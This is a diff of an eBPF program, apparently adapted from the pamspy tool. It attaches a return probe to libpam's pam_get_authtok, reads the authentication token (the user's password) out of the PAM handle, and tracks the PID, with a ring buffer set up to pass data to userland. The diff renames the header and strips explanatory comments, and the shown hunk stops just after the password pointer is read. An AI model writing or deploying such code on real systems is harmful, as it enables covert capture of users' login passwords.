@@ -1,57 +1,38 @@
 //go:build ignore
 
 #include "vmlinux.h"
-#include "pamspy_event.h"
+#include "uretprobe.h"
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
 
 char __license[] SEC("license") = "Dual MIT/GPL";
 
-/******************************************************************************/
-/*!
- *  \brief  dump from source code of libpam
- *          This is a partial header
- */
 typedef struct pam_handle
 {
   char *authtok;
   unsigned caller_is;
   void *pam_conversation;
   char *oldauthtok;
-  char *prompt; /* for use by pam_get_user() */
+  char *prompt;
   char *service_name;
   char *user;
   char *rhost;
   char *ruser;
   char *tty;
   char *xdisplay;
-  char *authtok_type; /* PAM_AUTHTOK_TYPE */
+  char *authtok_type;
   void *data;
-  void *env; /* structure to maintain environment list */
+  void *env;
 } pam_handle_t;
 
-/******************************************************************************/
-/*!
- *  \brief  ring buffer use to communicate with userland process
- */
 struct
 {
   __uint(type, BPF_MAP_TYPE_RINGBUF);
   __uint(max_entries, 256 * 1024);
 } rb SEC(".maps");
 
-/******************************************************************************/
-/*!
- *  \brief  main userland return probe program
- *  
- *  int pam_get_authtok(pam_handle_t *pamh, int item,
- *                         const char **authtok, const char *prompt);
- *
- */
 
-
-// Force emitting struct event into the ELF.
 const struct event *unused __attribute__((unused));
 
 SEC("uretprobe/pam_get_authtok")
@@ -62,10 +43,8 @@ int trace_pam_get_authtok(struct pt_regs *ctx)
 
   pam_handle_t* phandle = (pam_handle_t*)PT_REGS_PARM1(ctx);
 
-  // Get current PID to track
   u32 pid = bpf_get_current_pid_tgid() >> 32;
 
-  // retrieve output parameter
   u64 password_addr = 0;
   bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->authtok);
 
